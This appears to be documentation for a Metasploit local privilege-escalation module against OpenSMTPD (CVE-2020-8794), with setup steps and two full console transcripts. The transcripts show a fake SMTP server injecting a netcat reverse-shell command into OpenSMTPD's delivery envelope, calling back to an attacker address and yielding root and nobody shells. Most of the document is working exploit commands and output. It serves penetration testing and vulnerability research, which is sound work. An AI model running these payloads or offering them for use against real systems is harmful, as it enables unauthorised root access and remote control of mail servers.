## Vulnerable Application

### Description

This module exploits an out-of-bounds read of an attacker-controlled
string in OpenSMTPD's MTA implementation to execute a command as the
root or nobody user, depending on the kind of grammar OpenSMTPD uses.

### Setup

1. Download [OpenBSD 6.6](https://cdn.openbsd.org/pub/OpenBSD/6.6/amd64/install66.iso)
2. Install the system

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This targets OpenSMTPD versions < 6.6.4 by automatically selecting the
appropriate grammar.

## Options

### SESSION

Set this to a valid session ID on an OpenBSD target.

## Scenarios

### OpenSMTPD 6.6.0 on OpenBSD 6.6

```
msf5 > use exploit/unix/local/opensmtpd_oob_read_lpe
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > options

Module options (exploit/unix/local/opensmtpd_oob_read_lpe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  25               yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   OpenSMTPD < 6.6.4 (automatic grammar selection)


msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > set lhost 172.16.249.1
lhost => 172.16.249.1
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > set session 1
session => 1
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > run

[+] mkfifo /tmp/gkhbba; nc 172.16.249.1 4444 0</tmp/gkhbba | /bin/sh >/tmp/gkhbba 2>&1; rm /tmp/gkhbba
[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 172.16.249.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] OpenSMTPD 6.6.0 is using new grammar
[+] The target appears to be vulnerable. OpenSMTPD 6.6.0 appears vulnerable to CVE-2020-8794.
[*] Started service listener on 0.0.0.0:25
[*] Executing local sendmail(8) command: /usr/sbin/sendmail 'brvaysxuzssmnjkysoh@[172.16.249.1]' < /dev/null && echo true
[*] Client 172.16.249.137:37747 connected
[*] Exploiting new OpenSMTPD grammar for a root shell
[*] Faking SMTP server and sending exploit
[*] Sending: 220
[*] Expecting: /EHLO /
[+] Received: EHLO
[*] Sending: 250
[*] Expecting: /MAIL FROM:<[^>]/
[+] Received: foo.localdomain
MAIL FROM:<w
[*] Sending: 553-
553

dispatcher: local_mail
type: mda
mda-user: root
mda-exec: mkfifo /tmp/rettgqm; nc 172.16.249.1 4444 0</tmp/rettgqm | /bin/sh >/tmp/rettgqm 2>&1; rm /tmp/rettgqm; exit 0

[*] Disconnecting client 172.16.249.137:37747
[*] Command shell session 3 opened (172.16.249.1:4444 -> 172.16.249.137:3005) at 2020-03-03 18:40:54 -0600
[*] Server stopped.

id
uid=0(root) gid=0(wheel) groups=0(wheel)
uname -a
OpenBSD foo.localdomain 6.6 GENERIC#353 amd64
^Z
Background session 3? [y/N]  y
```

### OpenSMTPD 6.0.4 on OpenBSD 6.3

```
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > set session 2
session => 2
msf5 exploit(unix/local/opensmtpd_oob_read_lpe) > run

[+] mkfifo /tmp/hkioy; nc 172.16.249.1 4444 0</tmp/hkioy | /bin/sh >/tmp/hkioy 2>&1; rm /tmp/hkioy
[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 172.16.249.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] OpenSMTPD 6.0.4 is using old grammar
[+] The target appears to be vulnerable. OpenSMTPD 6.0.4 appears vulnerable to CVE-2020-8794.
[*] Started service listener on 0.0.0.0:25
[*] Executing local sendmail(8) command: /usr/sbin/sendmail 'nozahdogyxewkv@[172.16.249.1]' < /dev/null && echo true
[*] Client 172.16.249.138:10203 connected
[*] Exploiting old OpenSMTPD grammar for a nobody shell
[*] Faking SMTP server and sending exploit
[*] Sending: 220
[*] Expecting: /EHLO /
[+] Received: EHLO
[*] Sending: 250
[*] Expecting: /MAIL FROM:<[^>]/
[+] Received: foo.localdomain
MAIL FROM:<w
[*] Sending: 553-
553

type: mda
mda-method: mda
mda-usertable: <getpwnam>
mda-user: nobody
mda-buffer: mkfifo /tmp/jszy; nc 172.16.249.1 4444 0</tmp/jszy | /bin/sh >/tmp/jszy 2>&1; rm /tmp/jszy; exit 0

[*] Disconnecting client 172.16.249.138:10203
[*] Command shell session 4 opened (172.16.249.1:4444 -> 172.16.249.138:40377) at 2020-03-03 18:41:06 -0600
[*] Server stopped.

id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)
uname -a
OpenBSD foo.localdomain 6.3 GENERIC#100 amd64
```
